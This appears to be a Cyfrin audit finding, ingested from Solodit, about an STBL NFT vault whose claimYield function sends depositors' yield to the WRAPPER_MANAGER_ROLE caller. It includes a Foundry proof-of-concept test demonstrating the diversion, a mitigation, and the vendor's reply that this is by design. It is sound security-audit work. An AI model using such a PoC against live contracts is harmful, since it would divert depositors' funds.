---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-17-cyfrin-stbl-ess-v2-0-4-1
ingested_at: '2026-08-23T05:04:32Z'
protocol_category: []
published_at: '2026-06-17T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-17-cyfrin-stbl-ess-v2-0
title: '`STBL_XLayer_NFT_Vault::claimYield` routes yield to caller instead of lot
  owner, permanently diverting depositor rewards to `WRAPPER_MANAGER_ROLE`'
vuln_class: []
---

# `STBL_XLayer_NFT_Vault::claimYield` routes yield to caller instead of lot owner, permanently diverting depositor rewards to `WRAPPER_MANAGER_ROLE`

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-17-cyfrin-stbl-ess-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md)_

---

**Description:** `STBL_ESS_NFT_Vault1` manages user YLD NFT positions as "lots," each assigned an owner via `ownerOfLot`.
The purpose of `_Vault_claimYield(address _recipient, uint256 _lotId)` is to collect accrued rewards from the `YieldDistributor` for all NFTs in a given lot and forward the proceeds to the appropriate recipient. However, the function never consults `ownerOfLot[_lotId]` when determining where to send the yield. Instead it aliases `_recipient` as `caller` and unconditionally transfers all claimed tokens there, regardless of who actually owns the lot.
```solidity
// STBL_ESS_NFT_Vault1.sol lines 183, 215
address caller = _recipient; // ownerOfLot[_lotId] is never consulted
// ...
IERC20(tokenAddresses[i]).transfer(caller, claimedAmounts[i]);
```

`STBL_XLayer_NFT_Vault::claimYield` passes `msg.sender` as `_recipient`. The result is that yield is always routed to whoever triggered the call (WRAPPER_MANAGER_ROLE) — not to the lot's depositor.
```solidity
// STBL_XLayer_NFT_Vault.sol lines 104-108
function claimYield(
    uint256 _lotId
) external onlyRole(WRAPPER_MANAGER_ROLE) returns (uint256[] memory) {
    return _Vault_claimYield(msg.sender, _lotId); // msg.sender forwarded as _recipient
}
```


When a `WRAPPER_MANAGER_ROLE` holder calls `claimYield` against a lot they do not own, the depositor's accrued rewards flow to the caller's address instead. Because the `YieldDistributor` marks rewards as claimed on each invocation, that yield cycle is permanently lost to the rightful owner — no subsequent call can recover it.

**Impact:** The loss per event equals the yield accumulated on the targeted lot since its last claim, and the diversion compounds over the pool's lifetime as rewards accumulate between claim intervals. The minimum actor class required is any account holding `WRAPPER_MANAGER_ROLE`.

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./XLayer_Setup.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ClaimYieldOwnership_PoC
 * @notice PoC: _Vault_claimYield routes yield to the caller (msg.sender) rather than
 *         to the lot's owner. The concrete entry point passes msg.sender as _recipient
 *         and never consults ownerOfLot[_lotId], so yield is always delivered to whoever
 *         triggers the call — not to the depositor who owns the lot.
 *
 * Root cause: STBL_ESS_NFT_Vault1._Vault_claimYield() (lines 177-220) aliases _recipient
 * as `caller` and transfers all claimed tokens there without ever reading ownerOfLot[_lotId].
 * STBL_XLayer_NFT_Vault.claimYield() passes msg.sender as _recipient, so any
 * WRAPPER_MANAGER_ROLE holder calling claimYield(lotId) receives the depositor's yield
 * instead of the depositor receiving it.
 */
contract ClaimYieldOwnership_PoC is XLayer_Setup {
    uint256 constant DEPOSIT_AMOUNT = 9_696e18;

    function setUp() public override {
        super.setUp();
        mintTestTokensToUser(user1, 100_000 * 10 ** 18);
        approveWrapperForUser(user1);
    }

    /// @notice PoC: _Vault_claimYield sends lot yield to caller instead of lot owner
    /// @dev Title:    _Vault_claimYield routes yield to caller instead of lot owner, permanently diverting depositor rewards
    ///      Affected: STBL_ESS_NFT_Vault1._Vault_claimYield() (lines 177-220), STBL_XLayer_NFT_Vault.claimYield()
    ///      Impact:   Depositor's accrued yield is delivered to the WRAPPER_MANAGER_ROLE caller, not to the lot owner
    ///      Author:   0xStalin
    function test_poc_YieldFromVictimLot_is_redirected_to_wrapperManager() public {

        // == [ Setup ] ==

        // user1 deposits to create a lot with two YLD NFTs (one per asset)
        vm.startPrank(user1);
        uint256 lotId = xLayerWrapper.ess_deposit(DEPOSIT_AMOUNT);
        vm.stopPrank();

        console.log("[*] user1 lot ID:", lotId);
        console.log("[*] lot owner:", xLayerNFTVault.fetchOwnerOfLot(lotId));

        // Confirm lot ownership: yield should flow to user1, not to whoever calls claimYield
        assertEq(xLayerNFTVault.fetchOwnerOfLot(lotId), user1, "Pre-condition: user1 must own the lot");

        // == [ Generate Yield ] ==

        // Bump oracle prices to accumulate yield in the YieldDistributor for both assets
        for (uint256 i = 0; i < 7; i++) {
            testOracle1.setPrice();
        }
        for (uint256 i = 0; i < 60; i++) {
            testOracle2.setPrice();
        }

        // Advance time so yield distribution is eligible
        vm.warp(block.timestamp + 2 days);

        // distributeYield is gated by onlyWrapper modifier — must be called as xLayerWrapper
        vm.startPrank(address(xLayerWrapper));
        vault1.distributeYield();
        vault2.distributeYield();
        vm.stopPrank();

        // == [ Claim Yield as wrapperManager ] ==

        // Snapshot balances before the claim to measure where yield actually lands
        uint256 callerToken1Before = testToken1.balanceOf(wrapperManager);
        uint256 callerToken2Before = testToken2.balanceOf(wrapperManager);
        uint256 ownerToken1Before = testToken1.balanceOf(user1);
        uint256 ownerToken2Before = testToken2.balanceOf(user1);

        // wrapperManager calls claimYield on user1's lot.
        // _Vault_claimYield routes proceeds to _recipient == msg.sender (wrapperManager),
        // never reading ownerOfLot[lotId]. Yield goes to the caller, not the lot owner.
        vm.prank(wrapperManager);
        xLayerNFTVault.claimYield(lotId);

        uint256 callerToken1Received = testToken1.balanceOf(wrapperManager) - callerToken1Before;
        uint256 callerToken2Received = testToken2.balanceOf(wrapperManager) - callerToken2Before;

        console.log("[*] Token1 received by caller (wrapperManager):", callerToken1Received);
        console.log("[*] Token2 received by caller (wrapperManager):", callerToken2Received);

        // == [ Verify Impact ] ==

        // Caller (wrapperManager) received yield that belongs to user1
        assertGt(callerToken1Received, 0, "caller must have received token1 yield that belongs to user1");
        assertGt(callerToken2Received, 0, "caller must have received token2 yield that belongs to user1");

        // A second claimYield call on the same lot returns zero — the YieldDistributor already
        // marked rewards claimed, so user1's yield window for this cycle is permanently exhausted
        vm.prank(wrapperManager);
        uint256[] memory secondCallAmounts = xLayerNFTVault.claimYield(lotId);

        for (uint256 i = 0; i < secondCallAmounts.length; i++) {
            assertEq(secondCallAmounts[i], 0, "Second claimYield call must return zero - yield cycle exhausted");
        }

        // user1 (the lot owner) received nothing — yield was routed to the caller instead
        assertEq(testToken1.balanceOf(user1), ownerToken1Before, "lot owner did not receive token1 yield");
        assertEq(testToken2.balanceOf(user1), ownerToken2Before, "lot owner did not receive token2 yield");

        console.log("[+] CONFIRMED: yield routed to caller (wrapperManager) instead of lot owner (user1)");
    }
}
```

**Recommended Mitigation:** Route the claimed yield to `ownerOfLot[_lotId]` rather than to the caller-supplied `_recipient`, so that yield is always delivered to the lot's depositor.

**STBL:** Acknowledged. This is by design to allow WRAPPER_MANAGER_ROLE to distribute yield via their own yield management system (i.e. staked rewards).
